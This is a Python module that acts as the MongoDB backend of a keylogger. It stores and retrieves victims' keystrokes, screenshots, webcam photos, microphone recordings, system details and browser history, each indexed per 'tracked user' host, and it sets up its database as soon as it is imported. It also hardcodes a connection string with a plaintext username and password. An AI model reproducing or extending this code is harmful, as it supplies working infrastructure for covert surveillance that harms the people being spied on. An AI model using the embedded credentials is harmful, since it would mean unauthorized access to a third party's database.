import os
import pymongo
from pymongo import MongoClient
from datetime import datetime
import json
import base64
from bson.binary import Binary
import uuid

# MongoDB connection string
MONGO_URI = "mongodb+srv://rounakchatterjee501:rounak501@cluster0.zouzehl.mongodb.net/"
DB_NAME = "keylogger_db"

# Collections
COLL_KEYLOGS = "key_logs"
COLL_SCREENSHOTS = "screenshots"
COLL_WEBCAM = "webcam_pics"
COLL_MICROPHONE = "mic_recordings"
COLL_SYSTEM_INFO = "system_info"
COLL_BROWSER_HISTORY = "browser_history"
COLL_USERS = "tracked_users"

def get_database():
    """Connect to MongoDB and return database object"""
    try:
        client = MongoClient(MONGO_URI)
        db = client[DB_NAME]
        return db
    except Exception as e:
        print(f"Error connecting to MongoDB: {str(e)}")
        return None

def initialize_db():
    """Create initial collections and indexes if they don't exist"""
    try:
        db = get_database()
        if db is None:
            return False
            
        # Create collections if they don't exist
        if COLL_KEYLOGS not in db.list_collection_names():
            db.create_collection(COLL_KEYLOGS)
            db[COLL_KEYLOGS].create_index([("user_id", pymongo.ASCENDING)])
            db[COLL_KEYLOGS].create_index([("timestamp", pymongo.DESCENDING)])
            
        if COLL_SCREENSHOTS not in db.list_collection_names():
            db.create_collection(COLL_SCREENSHOTS)
            db[COLL_SCREENSHOTS].create_index([("user_id", pymongo.ASCENDING)])
            db[COLL_SCREENSHOTS].create_index([("timestamp", pymongo.DESCENDING)])
            
        if COLL_WEBCAM not in db.list_collection_names():
            db.create_collection(COLL_WEBCAM)
            db[COLL_WEBCAM].create_index([("user_id", pymongo.ASCENDING)])
            db[COLL_WEBCAM].create_index([("timestamp", pymongo.DESCENDING)])
            
        if COLL_MICROPHONE not in db.list_collection_names():
            db.create_collection(COLL_MICROPHONE)
            db[COLL_MICROPHONE].create_index([("user_id", pymongo.ASCENDING)])
            db[COLL_MICROPHONE].create_index([("timestamp", pymongo.DESCENDING)])
            
        if COLL_SYSTEM_INFO not in db.list_collection_names():
            db.create_collection(COLL_SYSTEM_INFO)
            db[COLL_SYSTEM_INFO].create_index([("user_id", pymongo.ASCENDING)])
            
        if COLL_BROWSER_HISTORY not in db.list_collection_names():
            db.create_collection(COLL_BROWSER_HISTORY)
            db[COLL_BROWSER_HISTORY].create_index([("user_id", pymongo.ASCENDING)])
            
        if COLL_USERS not in db.list_collection_names():
            db.create_collection(COLL_USERS)
            db[COLL_USERS].create_index([("user_id", pymongo.ASCENDING)], unique=True)
            db[COLL_USERS].create_index([("hostname", pymongo.ASCENDING)])
            
        return True
    except Exception as e:
        print(f"Error initializing database: {str(e)}")
        return False

def register_user(hostname, ip_address, os_info):
    """Register a new tracked user/system and return user_id"""
    try:
        db = get_database()
        if db is None:
            return None
            
        # Check if user already exists with this hostname
        existing_user = db[COLL_USERS].find_one({"hostname": hostname})
        if existing_user:
            return existing_user["user_id"]
            
        # Create new user
        user_id = str(uuid.uuid4())
        user_data = {
            "user_id": user_id,
            "hostname": hostname,
            "ip_address": ip_address,
            "os_info": os_info,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
        
        db[COLL_USERS].insert_one(user_data)
        return user_id
        
    except Exception as e:
        print(f"Error registering user: {str(e)}")
        return None

def update_user_activity(user_id):
    """Update the last_active timestamp for a user"""
    try:
        db = get_database()
        if db is None:
            return False
            
        db[COLL_USERS].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        return True
    except Exception as e:
        print(f"Error updating user activity: {str(e)}")
        return False

def save_keylog(user_id, keylog_data):
    """Save keylog data to MongoDB"""
    try:
        db = get_database()
        if db is None:
            return False
            
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "keylog_data": keylog_data
        }
        
        db[COLL_KEYLOGS].insert_one(document)
        update_user_activity(user_id)
        return True
    except Exception as e:
        print(f"Error saving keylog: {str(e)}")
        return False

def save_screenshot(user_id, screenshot_data, timestamp=None):
    """Save screenshot image to MongoDB"""
    try:
        db = get_database()
        if db is None:
            return False
            
        if timestamp is None:
            timestamp = datetime.now()
            
        document = {
            "user_id": user_id,
            "timestamp": timestamp,
            "image_data": Binary(screenshot_data)
        }
        
        db[COLL_SCREENSHOTS].insert_one(document)
        update_user_activity(user_id)
        return True
    except Exception as e:
        print(f"Error saving screenshot: {str(e)}")
        return False

def save_webcam(user_id, webcam_data, timestamp=None):
    """Save webcam image to MongoDB"""
    try:
        db = get_database()
        if db is None:
            return False
            
        if timestamp is None:
            timestamp = datetime.now()
            
        document = {
            "user_id": user_id,
            "timestamp": timestamp,
            "image_data": Binary(webcam_data)
        }
        
        db[COLL_WEBCAM].insert_one(document)
        update_user_activity(user_id)
        return True
    except Exception as e:
        print(f"Error saving webcam image: {str(e)}")
        return False

def save_audio(user_id, audio_data, timestamp=None):
    """Save audio recording to MongoDB"""
    try:
        db = get_database()
        if db is None:
            return False
            
        if timestamp is None:
            timestamp = datetime.now()
            
        document = {
            "user_id": user_id,
            "timestamp": timestamp,
            "audio_data": Binary(audio_data)
        }
        
        db[COLL_MICROPHONE].insert_one(document)
        update_user_activity(user_id)
        return True
    except Exception as e:
        print(f"Error saving audio recording: {str(e)}")
        return False

def save_system_info(user_id, system_info_data):
    """Save system information to MongoDB"""
    try:
        db = get_database()
        if db is None:
            return False
            
        # First check if we already have system info for this user
        existing = db[COLL_SYSTEM_INFO].find_one({"user_id": user_id})
        
        if existing:
            # Update existing record
            db[COLL_SYSTEM_INFO].update_one(
                {"user_id": user_id},
                {
                    "$set": {
                        "system_info": system_info_data,
                        "updated_at": datetime.now()
                    }
                }
            )
        else:
            # Create new record
            document = {
                "user_id": user_id,
                "system_info": system_info_data,
                "created_at": datetime.now(),
                "updated_at": datetime.now()
            }
            db[COLL_SYSTEM_INFO].insert_one(document)
            
        update_user_activity(user_id)
        return True
    except Exception as e:
        print(f"Error saving system info: {str(e)}")
        return False

def save_browser_history(user_id, browser_history_data):
    """Save browser history to MongoDB"""
    try:
        db = get_database()
        if db is None:
            return False
            
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "browser_data": browser_history_data
        }
        
        db[COLL_BROWSER_HISTORY].insert_one(document)
        update_user_activity(user_id)
        return True
    except Exception as e:
        print(f"Error saving browser history: {str(e)}")
        return False

def get_all_users():
    """Get a list of all tracked users"""
    try:
        db = get_database()
        if db is None:
            return []
            
        users = list(db[COLL_USERS].find({}))
        return users
    except Exception as e:
        print(f"Error fetching users: {str(e)}")
        return []

def get_user_keylogs(user_id, limit=100):
    """Get keylog data for a specific user"""
    try:
        db = get_database()
        if db is None:
            return []
            
        keylogs = list(db[COLL_KEYLOGS].find(
            {"user_id": user_id}
        ).sort("timestamp", -1).limit(limit))
        
        return keylogs
    except Exception as e:
        print(f"Error fetching keylogs: {str(e)}")
        return []

def get_user_screenshots(user_id, limit=20):
    """Get screenshots for a specific user"""
    try:
        db = get_database()
        if db is None:
            return []
            
        screenshots = list(db[COLL_SCREENSHOTS].find(
            {"user_id": user_id}
        ).sort("timestamp", -1).limit(limit))
        
        return screenshots
    except Exception as e:
        print(f"Error fetching screenshots: {str(e)}")
        return []

def get_user_webcam_pics(user_id, limit=20):
    """Get webcam pictures for a specific user"""
    try:
        db = get_database()
        if db is None:
            return []
            
        webcam_pics = list(db[COLL_WEBCAM].find(
            {"user_id": user_id}
        ).sort("timestamp", -1).limit(limit))
        
        return webcam_pics
    except Exception as e:
        print(f"Error fetching webcam pictures: {str(e)}")
        return []

def get_user_audio_recordings(user_id, limit=20):
    """Get audio recordings for a specific user"""
    try:
        db = get_database()
        if db is None:
            return []
            
        recordings = list(db[COLL_MICROPHONE].find(
            {"user_id": user_id}
        ).sort("timestamp", -1).limit(limit))
        
        return recordings
    except Exception as e:
        print(f"Error fetching audio recordings: {str(e)}")
        return []

def get_user_system_info(user_id):
    """Get system information for a specific user"""
    try:
        db = get_database()
        if db is None:
            return None
            
        system_info = db[COLL_SYSTEM_INFO].find_one({"user_id": user_id})
        return system_info
    except Exception as e:
        print(f"Error fetching system info: {str(e)}")
        return None

def get_user_browser_history(user_id, limit=5):
    """Get browser history for a specific user"""
    try:
        db = get_database()
        if db is None:
            return []
            
        browser_history = list(db[COLL_BROWSER_HISTORY].find(
            {"user_id": user_id}
        ).sort("timestamp", -1).limit(limit))
        
        return browser_history
    except Exception as e:
        print(f"Error fetching browser history: {str(e)}")
        return []

def test_connection():
    """Test the MongoDB connection"""
    try:
        db = get_database()
        if db is not None:
            # Check if we can list collections
            db.list_collection_names()
            return True
        return False
    except Exception as e:
        print(f"MongoDB connection test failed: {str(e)}")
        return False

# Initialize the DB when this module is imported
initialize_db()